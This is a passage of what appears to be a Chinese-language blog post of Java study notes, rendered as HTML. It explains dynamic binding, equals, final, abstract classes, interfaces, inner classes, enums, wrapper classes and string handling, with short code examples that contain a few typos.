class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>       <span class="hljs-keyword">return</span> getI()+<span class="hljs-number">10</span>;<br>   &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">A</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> i=<span class="hljs-number">20</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getI</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sum1</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> i+<span class="hljs-number">10</span>;<br>    &#125;<br>&#125;<br>输出：<span class="hljs-number">30</span><span class="hljs-number">30</span><br></code></pre></td></tr></table></figure><p>1.当调用对象方法时，该方法会和该对象内存地址&#x2F;运行类型绑定</p><p>2.当调用对象属性时，没有动态绑定机制，就近原则</p><h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><h2 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h2><p>Object 是所有对象的父类，也就是所有对象都可以使用 Object 里面的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">equals getClass hashCode toString<br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title="&#x3D;&#x3D;"></a>&#x3D;&#x3D;</h2><p>判断基本类型和引用类型</p><p>基本类型判断<strong>值</strong>，引用类型判断<strong>地址</strong></p><h2 id="equals-1"><a href="#equals-1" class="headerlink" title="equals"></a>equals</h2><p><strong>只能判断引用类型，默认判断地址是否相等</strong></p><p>子类一般会重写 equals 方法，判断内容是否相等，比如 Integer、String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">Person p1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p1.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  Person p2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>  p2.name=<span class="hljs-string">&quot;abc&quot;</span>;<br>  System.out.println(p1==p2); <span class="hljs-comment">//False</span><br>  System.out.println(p1.equals(p2));  <span class="hljs-comment">//False</span><br>  System.out.println(p1.name.equals(p2.name));    <span class="hljs-comment">//True</span><br>  System.out.println(p1.name==p2.name);   <span class="hljs-comment">//True</span><br>      <br>  String s1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  String s2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;a&quot;</span>);<br>  System.out.println(s1==s2); <span class="hljs-comment">//False</span><br>  System.out.println(s1.equals(s2));  <span class="hljs-comment">//True</span><br></code></pre></td></tr></table></figure><h1 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h1><h2 id="toString-方法"><a href="#toString-方法" class="headerlink" title="toString 方法"></a>toString 方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>    retrun <span class="hljs-title function_">getClass</span><span class="hljs-params">()</span>.getName()+<span class="hljs-string">&quot;@&quot;</span>+Integer.toHexString(hashCode());<br>&#125;<br></code></pre></td></tr></table></figure><p>默认返回：全类名+@+哈希值的十六进制</p><p>子类往往重写 toString 方法，用于返回对象的属性信息</p><p>直接输出一个对象时，toString 方法会被默认调用</p><h2 id="finalize-方法"><a href="#finalize-方法" class="headerlink" title="finalize 方法"></a>finalize 方法</h2><p>子类重写该方法，释放资源</p><p>某个对象没有任何引用时，垃圾回收机制会销毁该对象，销毁前调用 finalize 方法</p><p>也可以通过 System.gc() 主动触发垃圾回收机制，但不一定马上回收</p><h1 id="final"><a href="#final" class="headerlink" title="final"></a>final</h1><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>a）不希望类被继承时</p><p>b）不希望属性值被修改时（常量）</p><p>c）不希望父类的方法被子类覆盖&#x2F;重写（override）</p><p>d）不希望局部变量（参数）被修改（局部变量）</p><p><strong>final修饰实例属性，可以在定义时，构造器、普通代码块中赋值</strong></p><p><strong>final修饰静态属性，可以在定义时、静态代码块中赋初值</strong></p><h2 id="final-注意事项"><a href="#final-注意事项" class="headerlink" title="final 注意事项"></a>final 注意事项</h2><p>a）final 修饰属性必须赋值，并且不可修改</p><p>b）final 可以修饰类、属性、方法和局部变量，不能修饰构造器</p><p>c）包装类（Double、Integer、Float、Boolean ）和 String 都是 final 类</p><p>d）final 修饰类不能被继承，但能被实例化（需要不被实例化把类改成 private）</p><p>e）final 和 static 搭配使用不会加载类</p><h1 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h1><h2 id="abstract-只能修饰类和方法"><a href="#abstract-只能修饰类和方法" class="headerlink" title="abstract 只能修饰类和方法"></a>abstract 只能修饰类和方法</h2><p>用 abstract 关键字修饰一个类时，这个类就叫抽象类，修饰方法时就叫抽象方法</p><h2 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h2><p>抽象类可以有任意成员，可以被继承，可以没有抽象方法</p><p><strong>抽象类不能被实例化</strong></p><p>有了抽象方法，这个类必须声明为 abstract</p><p>继承了抽象类，必须实现抽象类的所有抽象方法，除非它自己也声明为 abstract 类</p><p><strong>抽象方法不能使用 private、final 和 static 修饰</strong></p><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口名&#123;<br><span class="hljs-comment">//属性</span><br><span class="hljs-comment">//方法</span><br>&#125;<br>class 类名 implements 接口名&#123;<br>必须实现接口的所有抽象方法<br>&#125;<br></code></pre></td></tr></table></figure><p>用来制定规则</p><h2 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>不能被实例化</li><li>接口的修饰只能是 public 和默认，这点和类的修饰符是一样的</li><li>不能继承其他的类，但可以继承多个别的接口</li><li>接口中的方法都是 public 方法，抽象方法可以不用 abstract 修饰，public abstract 可以省略</li><li>一个普通类实现接口就必须将该接口的所有方法实现</li><li>抽象类实现接口，可以不用实现接口的方法</li><li>一个类同时可以实现多个接口</li><li>接口中的属性都是 <strong>public static final</strong> 修饰符</li></ul><p>​访问形式：<strong>接口名. 属性名</strong></p><h2 id="接口的多态特性"><a href="#接口的多态特性" class="headerlink" title="接口的多态特性"></a>接口的多态特性</h2><p>多态参数、向上转型、多态数组</p><h2 id="接口的多态传递"><a href="#接口的多态传递" class="headerlink" title="接口的多态传递"></a>接口的多态传递</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">A</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">B</span>()<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> <span class="hljs-keyword">implements</span>  <span class="hljs-title class_">A</span>&#123;&#125;<br>B b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br>A a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C</span>();<br></code></pre></td></tr></table></figure><h2 id="接口、继承"><a href="#接口、继承" class="headerlink" title="接口、继承"></a>接口、继承</h2><p>继承：提高代码复用性和可维护性</p><p>接口：设计好各种方法，让其他类去实现</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">AA</span>&#123;<span class="hljs-type">int</span> a=<span class="hljs-number">23</span>;&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BB</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AA</span>&#123;&#125;<br><br>main函数中：<br> BB b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BB</span>();<br>    System.out.println(b.a);<br>    System.out.println(AA.a);<br>    System.out.println(BB.a);<br></code></pre></td></tr></table></figure><h1 id="成员内部类"><a href="#成员内部类" class="headerlink" title="成员内部类"></a>成员内部类</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>定义在外部类的成员位置上</p><p>a）成员内部类（无 static 修饰）</p><p>b）静态内部类（使用 static 修饰）</p><p>定义在外部类的局部位置上（比如方法类）：</p><p>a）局部内部类（有类名）</p><p>b）匿名内部类（没有类名）</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的成员位置上，没有 static 修饰</p><h2 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类的所有成员，包含私有的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OuterClass</span>&#123;<br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;butterfly&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> sex=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;&#125;<br>    <br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;OuterClass static block&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OuterClass</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.age=age;<br>    &#125;<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">InnerClass</span>&#123;<br>        <span class="hljs-keyword">public</span> String language=<span class="hljs-string">&quot;java&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">abc</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(name);<br>            System.out.println(age);<br>            System.out.println(sex);<br>            test();<br>        &#125;<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;InnerClass block&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">InnerClass</span><span class="hljs-params">(String language)</span>&#123;<br>            <span class="hljs-built_in">this</span>.language=language;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>可以添加任意访问修饰符去修饰成员内部类，因为相当于一个成员</li><li>成员内部类不能定义静态成员</li><li>作用域与其他成员一样</li><li>外部类可以访问成员内部类</li><li>外部其他类可以访问成员内部类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>()..<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();<br></code></pre></td></tr></table></figure><p>​在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.this.成员）去访问</li></ul><h2 id="获取内部类的类名"><a href="#获取内部类的类名" class="headerlink" title="获取内部类的类名"></a>获取内部类的类名</h2><p>getClass、jeb</p><h1 id="静态内部类"><a href="#静态内部类" class="headerlink" title="静态内部类"></a>静态内部类</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><p>有 static 修饰</p><h2 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li><p>只能访问外部类的静态成员，包含私有的</p></li><li><p>作用域属于整个类</p></li><li><p>可以添加任意访问修饰符去修饰静态内部类</p></li><li><p>外部类可以访问静态内部类</p></li><li><p>外部其他类可以访问静态内部类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>.Inner();<br></code></pre></td></tr></table></figure><p>在外部类里面定义一个方法，返回内部类的对象</p><ul><li>外部类和内部类重名，就近原则。访问外部类成员，使用（外部类名.静态成员名）去访问</li></ul></li></ul><h1 id="局部内部类"><a href="#局部内部类" class="headerlink" title="局部内部类"></a>局部内部类</h1><h2 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h2><p>定义在外部类的局部位置上，比如方法中，并且有类名</p><h2 id="注意事项-6"><a href="#注意事项-6" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以直接访问外部类所有成员</li><li>如果定义在静态方法中，只能访问外部类的静态成员</li><li>不能添加访问修饰符，可以用final 修饰</li><li>作用域仅在代码块中，与局部变量一致</li><li>重名遵循就近原则，访问外部类成员用<strong>（外部类名.this.成员）</strong>去访问（实例方法中），静态方法中，（外部类名.静态成员名）访问</li><li>外部类不能访问局部内部类</li></ul><h1 id="匿名内部类"><a href="#匿名内部类" class="headerlink" title="匿名内部类"></a>匿名内部类</h1><h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><p>基于接口的匿名内部类</p><p>基于类（抽象类）的匿名内部类</p><h2 id="注意事项-7"><a href="#注意事项-7" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>可以访问外部类，受访问修饰符影响，局部内部类不能定义静态成员</li><li>只能创建一个实例</li><li>就近原则，匿名内部类处于外部类里面时<strong>（外部类名.this.成员）</strong>静态成员（外部类名.静态类名）</li><li>外部类不能访问匿名内部类</li><li>匿名内部类在定义的同时直接创建对象，并且当作实参传递</li></ul><h1 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h1><h2 id="自定义枚举类"><a href="#自定义枚举类" class="headerlink" title="自定义枚举类"></a>自定义枚举类</h2><ul><li>构造器私有化</li><li>public static final 修饰的属性</li><li>创建对象赋值给这些属性</li><li>定义 toString 方法</li></ul><h2 id="enum-类"><a href="#enum-类" class="headerlink" title="enum 类"></a>enum 类</h2><ul><li>关键字 enum 代替 class</li></ul><h2 id="使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类"><a href="#使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类" class="headerlink" title="使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类"></a>使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类</h2><ul><li>javap 反编译 class</li><li>不能被继承或再继承其他类，但是可以实现接口</li><li>使用 Enum 类相关方法</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">Season autumn=Season.AUTUMN;<br><span class="hljs-comment">//name()返回枚举对象的名字</span><br>System.out.println(autumn.name());<br><span class="hljs-comment">//ordinal()返回枚举对象的次序/编号，从0开始编号</span><br>System.out.println(autumn.ordinal());<br><span class="hljs-comment">//values()返回定义的所有枚举对象</span><br>Season[] values=Season.values();<br><span class="hljs-comment">//valueOf()将字符串转换成枚举对象，字符串必须为已有的枚举对象名</span><br>Season autumn1=Season <span class="hljs-title function_">valueOf</span><span class="hljs-params">(<span class="hljs-string">&quot;AUTUMN&quot;</span>)</span>;<br>System.out.println(Season.SUMMER.compareTo(SEason.AUTUMN));<span class="hljs-comment">//两个值相减</span><br><span class="hljs-comment">//toString()</span><br></code></pre></td></tr></table></figure><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>retrofit2</p><h2 id="基本-Annotation"><a href="#基本-Annotation" class="headerlink" title="基本 Annotation"></a>基本 Annotation</h2><ul><li>@Override：验证方法为重写父类方法，只能用于方法</li><li>@Deprecated：用于表示某个元素（类&#x2F;方法等）已过时</li><li>@SuppressWarnings({“all”})：抑制编译器警告</li></ul><h2 id="注解类"><a href="#注解类" class="headerlink" title="注解类"></a>注解类</h2><ul><li>@Target（ElementType.METHOD），指定注解范围</li><li>@Target 修饰注解的注释，称为元注解</li><li>@interface 是注解类</li></ul><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h1><p>try 包裹可能出现异常代码，catch 去捕获异常，try 出现异常，出现异常的代码后面不会执行</p><h1 id="throws-与-throw"><a href="#throws-与-throw" class="headerlink" title="throws 与 throw"></a>throws 与 throw</h1><p>抛出异常要与父类一致</p><p>throw: 后面跟异常对象</p><p>throws: 做异常处理方式，在方法中</p><h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><h2 id="包装类型和-String-类型的转换"><a href="#包装类型和-String-类型的转换" class="headerlink" title="包装类型和 String 类型的转换"></a>包装类型和 String 类型的转换</h2><p>a) 包装类型转 String 类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i=<span class="hljs-number">10</span>;<br> String s1=i.toString();<br> String s2=String.valueOf(i);<br> String s3=i+<span class="hljs-string">&quot;&quot;</span>;<br> System.out.println(s1);<br> System.out.println(s2);<br> System.out.println(s3);<br></code></pre></td></tr></table></figure><p>b）String 类型转包装类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer i1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(s1);<br>   Integer i2=Integer.valueOf(s2);<br>   Integer i3=Integer.parseInt(s3);<br>   System.out.println(i1);<br>   System.out.println(i2);<br>   System.out.println(i3);<br></code></pre></td></tr></table></figure><p>c）例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java">Object obj1=<span class="hljs-literal">true</span>?<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>):<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<span class="hljs-comment">//三元条件运算符是一个整体</span><br>   System.out.println(obj1);<span class="hljs-comment">//1.0</span><br><br>Object obj2;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-literal">true</span>)&#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>       obj2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Double</span>(<span class="hljs-number">2.0</span>);<br>   &#125;<br>   System.out.println(obj2);<span class="hljs-comment">//1</span><br><br><br>Integer i=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   Integer j=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Integer</span>(<span class="hljs-number">1</span>);<br>   System.out.println(i==j);  <span class="hljs-comment">//false</span><br>   <br>   Integer m=<span class="hljs-number">1</span>;<br>   Integer n=<span class="hljs-number">1</span>;<br>   System.out.println(m==n);<span class="hljs-comment">//True,指向同一个对象</span><br>   <br>   Integer x=<span class="hljs-number">128</span>;<br>   Integer y=<span class="hljs-number">128</span>;<br>   System.out.println(x==y);<span class="hljs-comment">//False超过范围，通过new去创建，不等</span><br>   <br>   Integer a=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">int</span> b=<span class="hljs-number">128</span>;<br>   System.out.println(a==b);<span class="hljs-comment">//True,存在基本数据类型，比较的是值</span><br><br></code></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>final 类，不能被继承</li><li>直接赋值，调用构造器</li><li>属性 private final char value[ ];存放字符串内容</li></ul><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;abcd&quot;</span>;<span class="hljs-comment">//指向常量池</span><br>String b=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<span class="hljs-comment">//指向对象，对象指向常量池</span><br>System.out.println(a.equals(b)); <span class="hljs-comment">//True</span><br>System.out.println(a==b);<span class="hljs-comment">//False</span><br></code></pre></td></tr></table></figure><h2 id="常量池字符串"><a href="#常量池字符串" class="headerlink" title="常量池字符串"></a>常量池字符串</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String s1=<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-comment">//hellojava</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">String a=<span class="hljs-string">&quot;hell&quot;</span>;<br>String b=<span class="hljs-string">&quot;jab&quot;</span>;<br>String c=a+b;<span class="hljs-comment">//new 了一个对象</span><br>String d=<span class="hljs-string">&quot;helljab&quot;</span>;<br>System.out.println(c==d);<br><span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">String str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>     <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] ch=&#123;<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>&#125;;<br>     change(str,ch);<br>     System.out.println(str);<br>     System.out.println(ch);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(String str,<span class="hljs-type">char</span> ch[])</span>&#123;<br>     str=<span class="hljs-string">&quot;java&quot;</span>;<br>     ch[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br> &#125;<br> <br> <span class="hljs-comment">//aava</span><br></code></pre></td></tr></table></figure><h1 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">String name=<span class="hljs-string">&quot;我虽然&quot;</span>;<br>String ISO_s=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(name.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);<br>System.out.println(ISO_s);<br>String UTF8_s= <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ISO_s.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);<br> System.out.println(UTF8_s);<br></code></pre></td></tr></table></figure><h1 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h1><h2 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h2><ul><li>不能被继承</li><li>父类是 AbstractStringBuilder</li><li>AbstractStringBuilder 有属性 char[] value,存放在堆中</li></ul><h2 id="StingBuffer-和-String-的转换"><a href="#StingBuffer-和-String-的转换" class="headerlink" title="StingBuffer 和 String 的转换"></a>StingBuffer 和 String 的转换</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">StringBuffer stringBuffer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<br>stringBuffer=stringBuffer.append(<span class="hljs-string">&quot;ac&quot;</span>)<br>String s=stringBuffer.toString();<br>String ss=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(stringBuffer);<br>System.out.println(s);<br><span class="hljs-comment">//abcdac</span><br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>append，toString</p><h2 id="String、StringBuffer、StringBuider"><a href="#String、StringBuffer、StringBuider" class="headerlink" title="String、StringBuffer、StringBuider"></a>String、StringBuffer、StringBuider</h2><p>StringBuider 效率最高，拼接字符串</p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p> sort 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java">Person abc=<span class="hljs-keyword">new</span> <span class="hljs-title 